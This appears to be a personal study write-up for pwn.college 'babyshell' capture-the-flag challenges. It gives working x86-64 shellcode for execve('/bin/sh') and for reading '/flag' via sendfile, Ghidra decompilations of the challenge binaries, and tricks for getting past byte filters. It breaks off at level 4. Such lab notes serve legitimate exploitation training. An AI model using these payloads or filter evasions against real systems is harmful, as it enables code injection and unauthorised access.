# Shellcoding

tmux can behave very funny with shellcodes.

Compilation with `gcc -z execstack` allows execution on the stack. The issue arises when a function captures an address on the stack. Overriding this address should be able to get shellcode execution.

Adding data in the code:

```s
.string "hello"
.byte 0x48, 0x45, 0x4c, 0x4c, 0x4f


mov rbx, 0x0068732f6e69622f    <--- move "/bin/sh\0" into rbx
push rbx                       <--- push the thing onto the stack
mov rdi, rsp		       <--- first argument to the function
```
Compilation: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
Extraction: `objcopy --dump-section .text=shellcode-raw shellcode-elf`
Inject the shellcode: `( cat shellcode-raw; cat ) | ./sample1`

## Debugging shellcodes

Simply use `strace` to trace the syscalls. Or use `gdb` for the same. Breakpoints can also be hardcoded into the shellcode through the `int3` instruction. In case of dynamic stuff, it is not always known where the shellcode ends up, so this is much easier in that case.

## Need to play around with opcodes?

Try [this](https://defuse.ca/online-x86-assembler.htm#disassembly). Shall be a faster tester than compiling on machine.

## Other architectures

Using cross-compiler toolchain and through emulators.

amd64: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
mips: `mips-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode-elg`

Running:
amd64: `./shellcode`
mips: `qemu-mips-static ./shellcode`

qemu has more options: `-strace` and `-g 1234` (remote gdb debugging)

## Examples

- For instance, shellcode basically tries to gain access to a shell of the form `execve('/bin/bash', NULL, NULL)` for arbitrary command execution.

```s
mov rax 59                 <----- execve syscall number
lea rdi, [rip+binsh]	   <----- first argument to the string
mov rsi, 0		   <----- second argument to NULL
mov rdx, 0		   <----- third argument to NULL
syscall			   <----- executing the syscall
binsh:
	.string "/bin/sh"
```

Other kinds of stuff: `sendfile(1, open("/flag", NULL), 0, 1000)`

```s
mov rbx, 0x00000067616c662f		<---------- pushes "/flag"
push rbx
mov rax, 2				<---------- syscall number of open()
mov rdi, rsp				<---------- first argument to open()
mov rsi, 0				<---------- second argument to open(): NULL
syscall					<---------- syscall

mov rdi, 1				<---------- first argument of sendfile(): the file descriptor (stdout)
mov rsi, rax				<---------- second argument of sendfile(): file descriptor returned by open()
mov rdx, 0				<---------- third argument
mov r10, 1000				<---------- fourth argument
mov rax, 40				<---------- syscall for sendfile()

syscall

mov rax, 60				<--------- syscall for exit()
syscall
```

## pwn.college challenge pointers

### babyshell_level1_teaching1

Instead of observing the source directly, better to download the binary and analyse it in ghidra. For full simulation, set SUID bit.

```s
sudo chown root.root babyshell_level1_teaching1

sudo chmod u+s babyshell_level1_teaching1
```
```c
undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  int local_1c;
  char **local_18;
  char **local_10;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  puts("To ensure that you are shellcoding, rather than doing other tricks, this");
  puts("will sanitize all environment variables and arguments and close all file");
  puts("descriptors > 2,");
  putchar(10);
  local_1c = 3;
  while (local_18 = param_2, local_1c < 10000) {
    close(local_1c);
    local_1c = local_1c + 1;
  }
  while (local_10 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_10 != (char *)0x0) {
    sVar1 = strlen(*local_10);
    memset(*local_10,0,sVar1);
    local_10 = local_10 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x17011000,0x4000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x17011000) {
    putchar(10);
    printf("Your shellcode will be read into memory at %p and executed. In this challenge,\n",
           shellcode_mem);
    puts("this address is constant across executions, so your shellcode can hard-code");
    puts("some addresses. Later challenges might not be so forgiving...");
    putchar(10);
    printf("Reading %#x bytes from stdin into %p.\n",0x4000,shellcode_mem);
    shellcode_size = read(0,shellcode_mem,0x4000);
    if (shellcode_size != 0) {
      putchar(10);
      puts("This challenge is about to execute the following shellcode:");
      putchar(10);
      print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
      putchar(10);
      puts("Executing shellcode!\n");
      (*shellcode_mem)();
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x17011000","<stdin>",0x7d,
                (char *)&__PRETTY_FUNCTION__.10951);
}

```
From this, it is clear that the code closes all file descriptors and clears the memory, inputs a shellcode at a specific location, and executes it at `(*shellcode)()`. So this is straightforward shellcode injection and execution. However, spawning a shell will not escalte the ID of the user. This is because `/bin/sh` is interally configured to drop privileges when run within a SUID binary. Thereby, write custom code in a C file, compile it into a binary, and point that in the shellcode instead.

### babyshell_level1_testing1 (Code injection)

This challenge is similar to the previous one.

```c

undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  int local_1c;
  char **local_18;
  char **local_10;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",0xe,(char *)&__PRETTY_FUNCTION__.3706);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  local_1c = 3;
  while (local_18 = param_2, local_1c < 10000) {
    close(local_1c);
    local_1c = local_1c + 1;
  }
  while (local_10 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_10 != (char *)0x0) {
    sVar1 = strlen(*local_10);
    memset(*local_10,0,sVar1);
    local_10 = local_10 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x17011000,0x4000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x17011000) {
    printf("Reading %#x bytes from stdin into %p.\n",0x4000,0x17011000);
    shellcode_size = read(0,shellcode_mem,0x4000);
    if (shellcode_size != 0) {
      puts("Executing shellcode!\n");
      (*shellcode_mem)();
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __assert_fail("shellcode_size > 0","<stdin>",0x27,(char *)&__PRETTY_FUNCTION__.3706);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x17011000","<stdin>",0x22,
                (char *)&__PRETTY_FUNCTION__.3706);
}
```

Similar attack path as the previous one.

### babyshell_level2_teaching1

This time, there is no `mmap`, thereby there is no information where the shellcode shall be placed in memory. Hence, things should be relative in building the shellcode. Ghidra does one stuff though: the shellcode is restricted to 16 byte buffer. The size is much larger if seen on the actual challenge source code. The same process works as before thereby, since that shellcode was also relatively placed in memory rather than hardcoded.

```c

undefined8 main(int param_1,char **param_2,char **param_3)

{
  undefined *puVar1;
  size_t sVar2;
  undefined *puVar3;
  long in_FS_OFFSET;
  int local_402c;
  char **local_4028;
  char **local_4020;
  undefined shellcode [16];
  undefined local_4008 [16376];
  long local_10;
  char *binary_name;
  
  puVar1 = &stack0xfffffffffffffff8;
  do {
    puVar3 = puVar1;
    *(undefined8 *)(puVar3 + -0x1000) = *(undefined8 *)(puVar3 + -0x1000);
    puVar1 = puVar3 + -0x1000;
  } while (puVar3 + -0x1000 != local_4008);
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    *(undefined8 *)(puVar3 + -0x1058) = 0x1017da;
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951,puVar3[-0x1058]);
  }
  *(undefined8 *)(puVar3 + -0x1058) = 0x1017e6;
  puts("###",puVar3[-0x1058]);
  binary_name = *param_2;
  *(undefined8 *)(puVar3 + -0x1058) = 0x101804;
  printf("### Welcome to %s!\n",binary_name);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101810;
  puts("###",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10181a;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101826;
  puts("This challenge reads in some bytes, modifies them (depending on the specific",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101832;
  puts("challenge configuration, and executes them as code! This is a common exploitation",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10183e;
  puts("scenario, called \"code injection\". Through this series of challenges, you will",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10184a;
  puts("practice your shellcode writing skills under various constraints!",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101854;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101860;
  puts("To ensure that you are shellcoding, rather than doing other tricks, this",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10186c;
  puts("will sanitize all environment variables and arguments and close all file",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101878;
  puts("descriptors > 2,",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101882;
  putchar(10,puVar3[-0x1058]);
  local_402c = 3;
  while (local_4028 = param_2, local_402c < 10000) {
    *(undefined8 *)(puVar3 + -0x1058) = 0x10189b;
    close(local_402c,puVar3[-0x1058]);
    local_402c = local_402c + 1;
  }
  while (local_4020 = param_3, *local_4028 != (char *)0x0) {
    binary_name = *local_4028;
    *(undefined8 *)(puVar3 + -0x1058) = 0x1018d0;
    sVar2 = strlen(binary_name,puVar3[-0x1058]);
    binary_name = *local_4028;
    *(undefined8 *)(puVar3 + -0x1058) = 0x1018ea;
    memset(binary_name,0,sVar2,puVar3[-0x1058]);
    local_4028 = local_4028 + 1;
  }
  while (*local_4020 != (char *)0x0) {
    binary_name = *local_4020;
    *(undefined8 *)(puVar3 + -0x1058) = 0x101923;
    sVar2 = strlen(binary_name,puVar3[-0x1058]);
    binary_name = *local_4020;
    *(undefined8 *)(puVar3 + -0x1058) = 0x10193d;
    memset(binary_name,0,sVar2,puVar3[-0x1058]);
    local_4020 = local_4020 + 1;
  }
  shellcode_mem = (code *)shellcode;
  *(undefined8 *)(puVar3 + -0x1058) = 0x10197d;
  printf("Placing shellcode on the stack at %p.\n",shellcode_mem);
  sz = ((ulong)(&stack0xfffffffffffffff8 + -(long)(puVar3 + -0x1050)) >> 3) + 2;
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019d0;
  sp = puVar3 + -0x1050;
  rp = (undefined *)register0x00000020;
  bp = &stack0xfffffffffffffff8;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019dc;
  puts("In this challenge, shellcode will be copied onto the stack and executed. Since",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019e8;
  puts("the stack location is randomized on every execution, your shellcode will need to",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019f4;
  puts("be *position-independent*.",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019fe;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a1e;
  printf("Reading %#x bytes from stdin into %p.\n",0x4000,shellcode_mem);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a37;
  shellcode_size = read(0,shellcode_mem,0x4000,puVar3[-0x1058]);
  if (shellcode_size != 0) {
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a73;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a7f;
    puts("This challenge is about to execute the following shellcode:",puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a89;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101aa2;
    print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101aac;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ab8;
    puts("Executing shellcode!\n",puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ac9;
    (*shellcode_mem)();
    if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ae2;
    __stack_chk_fail();
  }
                    /* WARNING: Subroutine does not return */
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a69;
  __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951,
                puVar3[-0x1058]);
}

```
### babyshell_level2_testing1

- Works with relative shellcode

### babyshell_level3_teaching1

This challenge requires the shellcode must not have any `0x48` byte.

```c
undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  uint local_24;
  char **local_20;
  char **local_18;
  int local_c;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  puts("To ensure that you are shellcoding, rather than doing other tricks, this");
  puts("will sanitize all environment variables and arguments and close all file");
  puts("descriptors > 2,");
  putchar(10);
  local_c = 3;
  while (local_18 = param_2, local_c < 10000) {
    close(local_c);
    local_c = local_c + 1;
  }
  while (local_20 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_20 != (char *)0x0) {
    sVar1 = strlen(*local_20);
    memset(*local_20,0,sVar1);
    local_20 = local_20 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x1337000,0x1000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x1337000) {
    putchar(10);
    printf("Your shellcode will be read into memory at %p and executed. In this challenge,\n",
           shellcode_mem);
    puts("this address is constant across executions, so your shellcode can hard-code");
    puts("some addresses. Later challenges might not be so forgiving...");
    putchar(10);
    printf("Reading %#x bytes from stdin into %p.\n",0x1000,shellcode_mem);
    shellcode_size = read(0,shellcode_mem,0x1000);
    if (shellcode_size == 0) {
                    /* WARNING: Subroutine does not return */
      __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951);
    }
    putchar(10);
    puts("Executing filter...");
    puts("This challenge requires that your shellcode have no H bytes!");
    local_24 = 0;
    while( true ) {
      if (shellcode_size <= (ulong)(long)(int)local_24) {
        putchar(10);
        puts("This challenge is about to execute the following shellcode:");
        putchar(10);
        print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
        putchar(10);
        puts("Executing shellcode!\n");
        (*shellcode_mem)();
        return 0;
      }
      if (shellcode_mem[(int)local_24] == (code)0x48) break;
      local_24 = local_24 + 1;
    }
    printf("Failed filter at byte %d!\n",(ulong)local_24);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x1337000","<stdin>",0x7d,
                (char *)&__PRETTY_FUNCTION__.10951);
}
```

Byte 48 comes from the fact that we are assembling in x86_64 and using 64 bit registers. Converting stuff to 32 bit makes things easier. Final shellcode:


```s
.global _start
_start:
.intel_syntax noprefix
mov eax, 59
lea edi, [rip+binsh]
xor esi, esi
xor edx, edx
syscall
binsh:
	.string "/bin/sh"
```
### babyshell_level3_testing1

Done with similar shellcode as before

### babyshell_level4_teaching1

Disassembling the stuff shows that there must be no null bytes this time. Null bytes can come up through 32 bit instructions for 64 bit architecture.
